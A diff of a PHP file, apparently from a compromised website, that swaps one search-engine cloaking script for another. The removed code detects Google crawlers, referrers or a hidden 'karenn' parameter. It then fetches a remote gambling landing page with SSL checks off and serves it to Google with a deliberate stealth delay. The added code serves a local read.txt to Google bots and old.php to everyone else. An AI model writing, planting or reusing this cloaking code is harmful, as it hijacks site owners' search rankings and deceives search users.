@@ -1,77 +1,18 @@
 <?php
-
-  $ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
-  $ip = $_SERVER['HTTP_CF_CONNECTING_IP']
-     ?? $_SERVER['HTTP_X_FORWARDED_FOR']
-     ?? $_SERVER['REMOTE_ADDR'] ?? '';
-  $ref = $_SERVER['HTTP_REFERER'] ?? '';
-  $path = parse_url($_SERVER['REQUEST_URI'] ?? '/', PHP_URL_PATH);
-
-  if (preg_match('/googlebot|inspectiontool|search.google/i', $ua)) {
-    header("X-LiteSpeed-Cache-Control: no-cache");
-    header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
-    header("Pragma: no-cache");
-    header("Expires: 0");
-    if (defined('LSCACHE_ENABLED')) do_action('litespeed_control_set_nocache');
-  }
-
-  $allow = [
-    "googlebot", "adsbot", "mediapartners", "apis-google",
-    "structured-data-testing-tool", "googlebot-image", "googlebot-video",
-    "googlebot-news", "google-inspectiontool", "inspectiontool"
-  ];
-
-  $is_bot = false;
-  foreach ($allow as $needle) {
-    if (strpos($ua, $needle) !== false) {
-      $host = @gethostbyaddr($ip);
-      $is_bot = (strpos($ua, 'googlebot') !== false && $host && $host !== $ip)
-        ? (strpos($host, 'google.com') !== false || strpos($host, 'googlebot.com') !== false)
-        : true;
-      break;
+function is_google_bot() {
+    $agents = array("Googlebot", "Google-Site-Verification", "Google-InspectionTool", "Googlebot-Mobile", "Googlebot-News");
+    foreach ($agents as $agent) {
+        if (strpos($_SERVER['HTTP_USER_AGENT'], $agent) !== false) return true;
     }
-  }
+    return false;
+}
 
-  $dir = '/'.trim(str_replace('\\', '/', str_replace($_SERVER['DOCUMENT_ROOT'] ?? '', '', __DIR__)), '/');
-  if ($dir === '') $dir = '/';
-
-  $triggered = $is_bot || strpos($ref, 'search.google.com') !== false || isset($_GET['karenn']);
-  if ($triggered && strpos($path, $dir) === 0) {
-
-    if ($is_bot) usleep(700000); // Delay stealth
-
-    $url = "https://playhub.b-cdn.net/LandingPage/raja-menang.html";
-    $html = '';
-
-    if (function_exists('curl_init')) {
-      $ch = curl_init($url);
-      curl_setopt_array($ch, [
-        CURLOPT_RETURNTRANSFER => 1,
-        CURLOPT_FOLLOWLOCATION => 1,
-        CURLOPT_TIMEOUT => 4,
-        CURLOPT_USERAGENT => $ua,
-        CURLOPT_SSL_VERIFYPEER => 0,
-        CURLOPT_SSL_VERIFYHOST => 0
-      ]);
-      $html = curl_exec($ch);
-      curl_close($ch);
-    } elseif (ini_get('allow_url_fopen')) {
-      $ctx = @stream_context_create([
-        "http" => [
-          "timeout" => 2,
-          "header" => "User-Agent: Mozilla/5.0\r\n"
-        ]
-      ]);
-      $html = @file_get_contents($url, false, $ctx);
-    }
-
-    if (strlen(trim($html)) > 50) {
-      while (ob_get_level()) @ob_end_clean();
-      header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
-      header("Pragma: no-cache");
-      header("Expires: 0");
-      header("Content-Type: text/html; charset=utf-8");
-      echo $html;
-      exit;
-    }
-  }
+if (is_google_bot()) {
+    $bot_content = file_get_contents('read.txt');
+    echo $bot_content;
+    exit;
+} else {
+    include('old.php');
+    exit;
+}
+?>
